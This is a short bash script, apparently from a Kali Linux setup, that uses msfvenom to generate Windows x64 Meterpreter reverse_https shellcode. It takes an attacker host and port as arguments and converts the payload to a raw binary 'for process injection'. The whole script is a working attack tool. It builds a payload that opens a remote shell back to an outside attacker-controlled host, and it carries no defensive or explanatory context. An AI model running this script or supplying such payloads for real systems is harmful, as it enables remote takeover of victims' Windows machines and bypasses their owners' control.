#!/bin/bash

# Generate raw shellcode for process injection
echo "=== Shellcode Generator for Process Injection ==="

if [ -z "$1" ] || [ -z "$2" ]; then
    echo "Usage: ./generate_shellcode.sh <LHOST> <LPORT>"
    exit 1
fi

LHOST=$1
LPORT=$2

echo "[*] Generating raw shellcode..."
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=$LHOST LPORT=$LPORT \
    -f python -v shellcode \
    -o /home/kali/payloads/shellcode.py

echo "[*] Converting to binary format..."
python3 -c "
import sys
sys.path.insert(0, '/home/kali/payloads')
from shellcode import shellcode
with open('/home/kali/payloads/shellcode.bin', 'wb') as f:
    f.write(shellcode)
"

echo "[+] Shellcode saved to: /home/kali/payloads/shellcode.bin"
